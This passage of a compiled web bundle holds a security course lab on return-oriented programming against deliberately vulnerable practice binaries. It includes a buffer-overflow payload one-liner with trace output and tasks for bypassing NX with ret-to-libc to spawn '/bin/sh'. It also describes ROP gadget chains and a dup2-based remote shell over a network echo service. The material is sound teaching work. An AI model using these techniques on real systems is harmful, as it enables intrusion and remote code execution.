lea    eax,[ebp-0x545]\n 804862d:   89 04 24                mov    DWORD PTR [esp],eax\n')),(0,i.yg)("p",null,"Lets try ",(0,i.yg)("inlineCode",{parentName:"p"},"0x804860f")," such that we print the ",(0,i.yg)("inlineCode",{parentName:"p"},"malloc")," failure message."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},'$ python2.7 -c \'print "A" * 1353 + "\\x0f\\x86\\x04\\x08"\' | ltrace -i -e puts ./auth\n[0x80485df] puts("Enter password: "Enter password:\n)                                                              = 17\n[0x804861b] puts("malloc failed"malloc failed\n)                                                                 = 14\n[0xffffffff] +++ exited (status 1) +++\n')),(0,i.yg)("h3",{id:"02-challenge---ret-to-libc"},"02. Challenge - ",(0,i.yg)("inlineCode",{parentName:"h3"},"ret-to-libc")),(0,i.yg)("p",null,"So far, so good!\nNow let's get serious and do something useful with this."),(0,i.yg)("p",null,"Continue working in the ",(0,i.yg)("inlineCode",{parentName:"p"},"01-tutorial-ret-to-libc/")," folder in the activities archive."),(0,i.yg)("p",null,"The final goal of this task is to bypass the NX stack protection and call ",(0,i.yg)("inlineCode",{parentName:"p"},'system("/bin/sh")'),".\nWe will start with a simple ",(0,i.yg)("inlineCode",{parentName:"p"},"ret-to-plt"),":"),(0,i.yg)("ol",null,(0,i.yg)("li",{parentName:"ol"},"Display all libc functions linked with the auth binary."),(0,i.yg)("li",{parentName:"ol"},"Return to ",(0,i.yg)("inlineCode",{parentName:"li"},"puts()"),".\nUse ltrace to show that the call is actually being made."),(0,i.yg)("li",{parentName:"ol"},"Find the offset of the ",(0,i.yg)("inlineCode",{parentName:"li"},'"malloc failed"')," static string in the binary."),(0,i.yg)("li",{parentName:"ol"},"Make the binary print ",(0,i.yg)("inlineCode",{parentName:"li"},'"failed"')," the second time ",(0,i.yg)("inlineCode",{parentName:"li"},"puts()")," is called."),(0,i.yg)("li",{parentName:"ol"},(0,i.yg)("strong",{parentName:"li"},"(bonus)")," The process should SEGFAULT after printing ",(0,i.yg)("inlineCode",{parentName:"li"},"Enter password:")," again.\nMake it exit cleanly (the exit code does not matter, just no ",(0,i.yg)("inlineCode",{parentName:"li"},"SIGSEGV"),").\nYou can move on to the next task without solving this problem."),(0,i.yg)("li",{parentName:"ol"},"Remember how we had ASLR disabled?\nThe other libc functions are in the memory, you just need to find their addresses.\nFind the offset of ",(0,i.yg)("inlineCode",{parentName:"li"},"system()")," in libc.\nFind the offset of the ",(0,i.yg)("inlineCode",{parentName:"li"},'"/bin/sh"')," string in libc."),(0,i.yg)("li",{parentName:"ol"},"Where is libc linked in the auth binary?\nCompute the final addresses and call ",(0,i.yg)("inlineCode",{parentName:"li"},'system("/bin/sh")')," just like you did with ",(0,i.yg)("inlineCode",{parentName:"li"},"puts()"),".")),(0,i.yg)("p",null,(0,i.yg)("strong",{parentName:"p"},"Hint 1"),":\nUse ",(0,i.yg)("inlineCode",{parentName:"p"},"LD_TRACE_LOADED_OBJECTS=1 ./auth")," instead of ",(0,i.yg)("inlineCode",{parentName:"p"},"ldd"),".\nThe latter is not always reliable, because the order in which it loads the libraries might be different than when you actually run the binary."),(0,i.yg)("p",null,(0,i.yg)("strong",{parentName:"p"},"Hint 2"),":\nWhen you finally attack this, ",(0,i.yg)("inlineCode",{parentName:"p"},"stdin")," will get closed and the new shell will have nothing to read.\nUse ",(0,i.yg)("inlineCode",{parentName:"p"},"cat")," to concatenate your attack string with ",(0,i.yg)("inlineCode",{parentName:"p"},"stdin")," like this:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"`cat <(python -c 'print \"L33T_ATTACK\"') - | ./vulnbinary`.\n")),(0,i.yg)("p",null,"Note the use of the ",(0,i.yg)("inlineCode",{parentName:"p"},"-")," (dash) character before the ",(0,i.yg)("inlineCode",{parentName:"p"},"|")," (pipe).\nThis prevents the closing of the input file descriptor of the pipe when ",(0,i.yg)("inlineCode",{parentName:"p"},"cat"),"'s output finished (i.e. when the ",(0,i.yg)("inlineCode",{parentName:"p"},"EOF")," character is received)."),(0,i.yg)("h3",{id:"03-challenge---no-ret-control"},"03. Challenge - ",(0,i.yg)("inlineCode",{parentName:"h3"},"no-ret-control")),(0,i.yg)("p",null,"Go to the ",(0,i.yg)("a",{parentName:"p",href:"/activities/03-challenge-no-ret-control/src"},(0,i.yg)("inlineCode",{parentName:"a"},"03-challenge-no-ret-control/"))," folder in the activities archive."),(0,i.yg)("p",null,"Imagine this scenario: we have an executable where we can change at least 4 bytes of random memory, but ASLR is turned on.\nWe cannot reliably change the value of the return address because of this.\nSometimes ",(0,i.yg)("inlineCode",{parentName:"p"},"ret")," is not even called at the end of a function."),(0,i.yg)("p",null,"Alter the execution of ",(0,i.yg)("inlineCode",{parentName:"p"},"force_exit"),", in order to call the secret function."),(0,i.yg)("h3",{id:"04-challenge---ret-to-plt"},"04. Challenge - ",(0,i.yg)("inlineCode",{parentName:"h3"},"ret-to-plt")),(0,i.yg)("p",null,"Go to the ",(0,i.yg)("a",{parentName:"p",href:"/activities/04-ret-to-plt/src"},(0,i.yg)("inlineCode",{parentName:"a"},"04-challenge-ret-to-plt/"))," folder in the activities archive."),(0,i.yg)("p",null,(0,i.yg)("inlineCode",{parentName:"p"},"random")," is a small application that generates a random number."),(0,i.yg)("p",null,"Your task is to build an exploit that makes the application always print the same second random number.\nThat is the first printed random number is whatever, but the second printed random number will always be the same, for all runs.\nIn the sample output below the second printed random number is always ",(0,i.yg)("inlineCode",{parentName:"p"},"1023098942")," for all runs."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"hari@solyaris-home:~$ python2.7 -c 'print <payload here>' | ./random\nHi! Options:\n    1. Get random number\n    2. Go outside\nHere's a random number: 2070249950. Have fun with it!\nHi! Options:\n    1. Get random number\n    2. Go outside\nHere's a random number: 1023098942. Have fun with it!\nSegmentation fault (core dumped)\nhari@solyaris-home:~$ python2.7 -c 'print <payload here>' | ./random\nHi! Options:\n    1. Get random number\n    2. Go outside\nHere's a random number: 1152946153. Have fun with it!\nHi! Options:\n    1. Get random number\n    2. Go outside\nHere's a random number: 1023098942. Have fun with it!\n")),(0,i.yg)("p",null,"You can use the Python skeleton given in section ",(0,i.yg)("a",{parentName:"p",href:"#nop-analogy"},(0,i.yg)("inlineCode",{parentName:"a"},"NOP")," Analogy")," for\nthe buffer overflow input."),(0,i.yg)("p",null,(0,i.yg)("strong",{parentName:"p"},"Bonus:")," The process should SEGFAULT after printing the second (constant) number.\nMake it exit cleanly (the exit code does not matter, just no ",(0,i.yg)("inlineCode",{parentName:"p"},"SIGSEGV"),")."),(0,i.yg)("h3",{id:"05-challenge---gadget-tutorial"},"05. Challenge - Gadget Tutorial"),(0,i.yg)("p",null,"This task requires you to construct a payload using gadgets and calling the functions inside such that it will print"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"Hello!\nstage A!stage B!\n")),(0,i.yg)("p",null,"Make it also print the messages in reverse order:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"Hello!\nstage B!stage A!\n")),(0,i.yg)("h3",{id:"06-bonus-challenge---echo-service"},"06. Bonus Challenge - Echo Service"),(0,i.yg)("p",null,"This task is a network service that can be exploited.\nRun it locally and try to exploit it.\nYou'll find that if you call ",(0,i.yg)("inlineCode",{parentName:"p"},'system("/bin/sh")')," the shell is opened in the terminal where the server was started instead of the one where the attack takes place.\nThis happens because the client-server communication takes place over a socket.\nWhen you spawn a shell it will inherit the Standard I/O descriptors from the parent and use those.\nTo fix this you need to redirect the socket fd into 0,1 (and optionally 2)."),(0,i.yg)("p",null,"So you will need to do the equivalent of the following, as part of a ",(0,i.yg)("inlineCode",{parentName:"p"},"ROP")," chain:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-c"},'dup2(sockfd, 1);\ndup2(sockfd, 0);\nsystem("/bin/sh");\n')),(0,i.yg)("p",null,"Exploit it first with ASLR disabled and then with it enabled."),(0,i.yg)("h2",{id:"conclusions"},"Conclusions"),(0,i.yg)("p",null,"At the end of this session, you should:"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},"Understand the limitations of classic buffer overflow attacks, as well as shellcodes."),(0,i.yg)("li",{parentName:"ul"},"Understand and visualise the effect of various simple ",(0,i.yg)("inlineCode",{parentName:"li"},"ROP")," attacks on a program's stack"),(0,i.yg)("li",{parentName:"ul"},"Be able to craft and make use of ",(0,i.yg)("inlineCode",{parentName:"li"},"ROP")," chains in order to hack vulnerable binaries")))}g.isMDXComponent=!0},1408:(e,n,a)=>{a.d(n,{A:()=>t});const t=a.p+"assets/images/overwatch_stack_conflict-76e06dfbb2b9d3135db672df76503b5e.png"},4478:(e,n,a)=>{a.d(n,{A:()=>t});const t=a.p+"assets/images/overwatch_stack_no_conflict-ea5f3850a718378846547dbfbef9c5cc.png"},8888:(e,n,a)=>{a.d(n,{A:()=>t});const t=a.p+"assets/images/overwatch_stack_simple-1c37527445225546b5c98e6a97ec363c.png"}}]);